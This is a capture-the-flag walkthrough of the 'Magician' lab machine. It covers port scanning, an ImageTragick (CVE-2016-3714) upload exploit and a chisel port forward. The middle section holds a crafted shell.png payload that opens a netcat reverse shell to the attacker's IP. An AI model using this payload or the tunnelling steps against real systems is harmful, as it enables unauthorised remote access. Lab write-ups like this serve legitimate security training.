---
title: Walkthrough - Magician
published: true
---

Tags: CVE-2016-3714, chisel, port forward, tunnel
Description: Boot2root machine for FIT and bsides guatemala CTF.
Difficulty: Easy
URL: [https://tryhackme.com/room/glitch](https://tryhackme.com/room/glitch)

* * *

## Notes

- `sudo nmap -Pn -sS -T4 -p- magician -vvv`

```
PORT     STATE SERVICE         REASON
21/tcp   open  ftp             syn-ack ttl 61
8080/tcp open  http-proxy      syn-ack ttl 61
8081/tcp open  blackice-icecap syn-ack ttl 61
```

Visiting the website we have a `Whitelabel Error Page`

![0xskar](/assets/magician01.png)

- `gobuster dir -u http://magician:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100` yeilds us a few results

```
/files                (Status: 200) [Size: 2]
/upload               (Status: 405) [Size: 0]
/error                (Status: 500) [Size: 105]
```

Port 8081 is where we find the magician site.

- create a shell.png with the following

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1 
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/ian; nc 10.2.127.225 6666 0</tmp/ian | /bin/sh >/tmp/ian 2>&1; rm /tmp/ian '
pop graphic.context
pop graphic.context
```

- setup pwncat listener and upload shell to recieve listener

* * * 

## user.txt?

![0xskar](/assets/magician02.png)

* * * 

## root.txt?

```
(remote) magician@magician:/home/magician$ cat the_magic_continues 
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

- `netstat -l` we can see a connection on port 6666
- upload `chisel` via http or pwncat
- now to portforward on attacker machine `chisel server --reverse --port 9001`
- and on target machine `./chisel client 10.2.127.225:9001 R:9002:127.0.0.1:6666`
- we can now access the magic cat on `http://localhost:9002/` and cat root.txt
- decode it!

* * * 

